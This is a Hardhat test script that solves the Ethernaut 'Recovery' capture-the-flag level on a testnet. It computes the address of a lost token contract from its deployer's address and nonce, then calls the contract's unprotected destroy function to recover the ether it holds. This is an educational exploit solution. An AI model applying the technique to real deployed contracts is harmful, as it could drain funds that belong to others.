// npx hardhat test ./test/17_recovery.js --network rinkeby

const { expect } = require("chai");
const { ethers } = require("hardhat");
const ETHERNAUT_LEVELS = require("../ethernaut-levels-config.js")
const Utils = require("./Utils.js");

let levelContract;
const INTERFACE_CONTRACT = "Recovery";

before(async () => {
    levelContract = await Utils.getLevelContract(ETHERNAUT_LEVELS._17_recovery, INTERFACE_CONTRACT);
});

it("solves the level", async function () {
    let lostAddress = ethers.utils.getContractAddress({
        from: levelContract.address,
        nonce: ethers.BigNumber.from(`1`),
    });
    console.log(`lostAddress`, lostAddress)

    let attackFactory = await ethers.getContractFactory(`SimpleToken`);
    let attack = await attackFactory.attach(lostAddress);

    const accounts = await ethers.getSigners();
    let tx = await attack.destroy(accounts[0].address);
    await tx.wait();
});

after(async () => {
    expect(await Utils.submitLevel(levelContract.address), "level was not completed").to.be.true;
});